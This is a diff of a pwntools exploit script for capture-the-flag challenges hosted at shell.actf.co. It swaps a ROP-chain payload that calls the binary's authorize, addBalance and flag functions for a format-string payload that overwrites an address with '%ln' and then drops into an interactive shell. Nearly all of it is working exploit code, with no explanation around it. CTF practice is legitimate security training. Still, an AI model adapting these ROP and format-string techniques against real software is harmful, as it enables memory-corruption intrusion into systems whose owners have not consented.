@@ -1,26 +1,15 @@
 from pwn import *
-r=remote('shell.actf.co',19400)
-#r=process("./chain_of_rope")
 
-b=ELF('./chain_of_rope')
+r=remote('shell.actf.co',19011)
+#r=process("./purchases")
+b=ELF('./purchases')
 
-context.log_level='debug'
-psrr=0x0000000000401401
-pdr=0x0000000000401403
-pay=""
-pay+='x'*0x38
-pay+=p64(b.symbols['authorize'])
-pay+=p64(pdr)
-pay+=p64(0xdeadbeef)
-pay+=p64(b.symbols['addBalance'])
-pay+=p64(pdr)
-pay+=p64(0xba5eba11)
-pay+=p64(psrr)
-pay+=p64(0xbedabb1e)
-pay+=p64(0xffffffff)
-pay+=p64(b.symbols['flag'])
+pay=''
+pay+='%4198838x'
+pay+='%10$ln'
+pay+=' '
+pay+='\x18\x40\x40\x33'
 
-r.sendline('1')
 r.sendline(pay)
-
 r.interactive()
+
